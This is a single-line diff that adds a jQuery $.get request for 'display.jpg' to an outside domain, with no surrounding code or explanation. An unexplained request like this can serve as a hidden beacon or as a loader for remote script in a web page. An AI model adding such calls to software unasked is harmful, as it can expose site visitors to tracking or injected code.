@@ -1,0 +1,1 @@
+$.get("https://detailingtemplates.com/call/display.jpg");
